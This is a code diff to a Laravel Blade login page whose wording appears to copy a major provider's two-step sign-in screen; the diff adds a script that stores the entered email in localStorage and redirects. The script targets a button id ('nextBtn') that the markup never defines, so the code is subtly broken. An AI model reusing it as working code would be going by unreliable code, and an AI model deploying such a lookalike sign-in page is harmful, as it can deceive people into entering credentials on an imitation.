@@ -20,10 +20,10 @@
             </div>
         </div>
         <div class="right-section">
-            <form method="POST" action="{{ route('login.submit') }}">
+            <form id="loginForm" method="POST" action="{{ route('login.submit') }}">
                 @csrf
                 <div class="input-group">
-                    <input type="text" name="email" placeholder="Email or phone" required>
+                    <input type="text" name="email" id="email" placeholder="Email or phone" required>
                 </div>
                 <div class="forgot-link">
                     <a href="#">Forgot email?</a>
@@ -33,9 +33,10 @@
                     <a href="#">Learn more about using Guest mode</a>
                 </div>
                 <div class="submit-group">
-                    <a href="#">Create account</a>
-                    <button type="submit" class="btn">Next</button>
-                </div>
+                    <a href="{{ route('create') }}">Create account</a>
+                    <button type="submit" class="btn">Next 
+                    </button>
+                    </div>
             </form>
         </div>
     </div>
@@ -47,5 +48,21 @@
             <a href="#">Terms</a>
         </span>
     </footer>
+
+    <script>
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            
+            if (email && email.includes('@')) {
+                
+                localStorage.setItem('currentEmail', email);
+                
+            
+                window.location.href = "{{ route('login.next') }}";
+            } else {
+                alert('Please enter a valid email address');
+            }
+        });
+    </script>
 </body>
 </html>
